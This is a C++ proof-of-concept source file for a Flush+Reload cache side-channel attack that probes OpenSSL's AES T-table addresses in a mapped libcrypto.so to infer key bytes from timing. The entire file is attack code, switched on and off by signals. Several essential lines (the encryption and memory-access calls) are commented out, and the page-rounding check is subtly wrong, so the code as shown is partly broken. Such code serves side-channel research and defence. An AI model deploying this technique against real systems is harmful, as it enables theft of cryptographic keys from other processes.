#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <openssl/aes.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include "cacheutils.h"
#include <map>
#include <vector>
#include <signal.h>

// this number varies on different systems
#define MIN_CACHE_MISS_CYCLES (120)

// more encryptions show features more clearly
#define NUMBER_OF_ENCRYPTIONS (1)

int attack_enabled = 0;  // Global flag to enable/disable the attack

void toggle_attack(int signal) {
    // Toggle attack state when SIGUSR1 or SIGUSR2 is received
    if (signal == SIGUSR1) {
        attack_enabled = 1;  // Enable the attack
        // printf("Attack enabled\n");
    } else if (signal == SIGUSR2) {
        attack_enabled = 0;  // Disable the attack
        // printf("Attack disabled\n");
    }
}

unsigned char key[] =
{
  0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30
  //0x51, 0x4d, 0xab, 0x12, 0xff, 0xdd, 0xb3, 0x32, 0x52, 0x8f, 0xbb, 0x1d, 0xec, 0x45, 0xce, 0xcc, 0x4f, 0x6e, 0x9c,
  //0x2a, 0x15, 0x5f, 0x5f, 0x0b, 0x25, 0x77, 0x6b, 0x70, 0xcd, 0xe2, 0xf7, 0x80
};

#define AES_KEY_SIZE 32

size_t sum;
size_t scount;

std::map<char*, std::map<size_t, size_t> > timings;

char* base;
char* probe;
char* end;

int main()
{
//   printf("AES key address: %p, size: %d bytes\n", (void*)key, AES_KEY_SIZE);
  int fd = open("/usr/local/ssl_vuln/lib/libcrypto.so", O_RDONLY);
  size_t size = lseek(fd, 0, SEEK_END);
  if (size == 0)
    exit(-1);
  size_t map_size = size;
  if (map_size & 0xFFF != 0)
  {
    map_size |= 0xFFF;
    map_size += 1;
  }
  base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
  end = base + size;

  unsigned char plaintext[] =
  {
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
  };
  unsigned char ciphertext[128];
  unsigned char restoredtext[128];

  AES_KEY key_struct;

  AES_set_encrypt_key(key, 128, &key_struct);

  uint64_t min_time = rdtsc();
  srand(min_time);
  sum = 0;
  signal(SIGUSR1, toggle_attack);  // SIGUSR1 to enable the attack
  signal(SIGUSR2, toggle_attack);  // SIGUSR2 to disable the attack

  // adjust me (decreasing order)
  int te0 = 0x1dfc00;
  int te1 = 0x1df800;
  int te2 = 0x1df400;
  int te3 = 0x1df000;

  printf("Probing address (Te0): %p\n", base + te0);
  printf("Probing address (Te1): %p\n", base + te1);
  printf("Probing address (Te2): %p\n", base + te2);
  printf("Probing address (Te3): %p\n", base + te3);
  
  while(1){
    signal(SIGUSR1, toggle_attack);  // SIGUSR1 to enable the attack
    signal(SIGUSR2, toggle_attack);  // SIGUSR2 to disable the attack
    if (attack_enabled) {
      for (size_t byte = 0; byte < 256; byte += 16)
        {
          plaintext[0] = byte;
          //plaintext[1] = byte;
          //plaintext[2] = byte;
          //plaintext[3] = byte;

          // AES_encrypt(plaintext, ciphertext, &key_struct);

          //adjust address range to exclude unwanted lines/tables
          for (probe = base + te3; probe < base + te0 + 64*16; probe += 64) // hardcoded addresses (could be done dynamically)
          {
            // printf("Probing address: %p\n", probe);
            size_t count = 0;
            for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
            {
              for (size_t j = 1; j < 16; ++j)
                plaintext[j] = rand() % 256;
              flush(probe);
              // AES_encrypt(plaintext, ciphertext, &key_struct);
              sched_yield();
              size_t time = rdtsc();
              // maccess(probe);
              size_t delta = rdtsc() - time;
              if (delta < MIN_CACHE_MISS_CYCLES)
                ++count;
            }
            sched_yield();
            timings[probe][byte] = count;
            sched_yield();
          }
        }
      }
  }
  close(fd);
  munmap(base, map_size);
  fflush(stdout);
  return 0;
}

